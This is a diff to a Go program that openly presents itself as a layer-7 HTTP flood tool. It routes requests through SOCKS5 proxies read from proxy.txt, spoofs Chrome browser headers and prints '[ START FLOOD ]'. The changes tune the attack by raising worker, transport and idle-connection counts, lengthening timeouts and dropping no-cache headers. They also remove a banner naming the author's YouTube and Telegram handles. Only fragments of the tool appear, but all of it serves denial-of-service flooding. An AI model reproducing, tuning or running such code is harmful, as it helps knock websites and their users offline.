@@ -22,13 +22,13 @@ import (
 )
 
 const (
-	WorkerCount      = 1550
-	TransportCount   = 550
-	MaxIdleConns     = 10000
-	MaxIdlePerHost   = 5000
+	WorkerCount      = 1500
+	TransportCount   = 1500
+	MaxIdleConns     = 20000
+	MaxIdlePerHost   = 10000
 	MaxConnsPerHost  = 0
-	RequestTimeout   = 2 * time.Second
-	TLSHandshakeTO   = 1 * time.Second
+	RequestTimeout   = 5 * time.Second
+	TLSHandshakeTO   = 3 * time.Second
 	ResponseHeaderTO = 1 * time.Second
 )
 
@@ -51,8 +51,6 @@ var BeHa = http.Header{
 	"Sec-Fetch-Mode":            {"navigate"},
 	"Sec-Fetch-Site":            {"none"},
 	"Sec-Fetch-User":            {"?1"},
-	"Cache-Control":             {"no-cache"},
-	"Pragma":                    {"no-cache"},
 	"sec-ch-ua":                 {`"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`},
 	"sec-ch-ua-mobile":          {"?0"},
 	"sec-ch-ua-platform":        {"Windows"},
@@ -142,7 +140,7 @@ func getCPUPercent() (float64, error) {
 	if err != nil {
 		return 0, err
 	}
-	time.Sleep(100 * time.Millisecond)
+	time.Sleep(150 * time.Millisecond)
 	total2, idle2, err := readCPUStats()
 	if err != nil {
 		return 0, err
@@ -219,20 +217,6 @@ func main() {
 		os.Exit(1)
 	}
 	fmt.Printf("VIEW : %d proxy.txt\n", len(proxies))
-
-	fmt.Printf("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡾⠃⠀⠀⠀⠀⠀⠀Runing : CloudShell\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀Server : None\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠻⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀Version : v1.3.0\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⢛⣿⣿⣶⣄⠙⠿⠀⠀⠀⠀⠀⠀⠀⠀Connection : Wifi\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢀⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀Dns : dns.adguard.com\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⢀⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀Requests By : Golang\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⣼⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀Sumber : go.sum\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Modifikasi : go.mod\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Country : Indonesia\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Device : Redmi-Xiaomi\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Cpu : 8 Core\n")
-	fmt.Printf("⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀YouTube : DizFlyze999\n")
-	fmt.Printf("⠀⠀⠀⠀⣠⣶⡿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Telegram : ytdizflyze\n")
 	fmt.Printf("\n🚀 ALL FAST SPAM METHOD\n")
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 	fmt.Printf("+ Threads : %d\n", WorkerCount)
@@ -242,7 +226,7 @@ func main() {
 	fmt.Printf("+ Layers  : Seven\n")
 	fmt.Printf("+ Proxies : %d ( SOCKS5 )\n", len(proxies))
 	fmt.Printf("+ TransCn : %d\n", TransportCount)
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 	fmt.Println("╰─▶ [ START FLOOD ]")
 
 	transportPool := make([]*http.Transport, TransportCount)
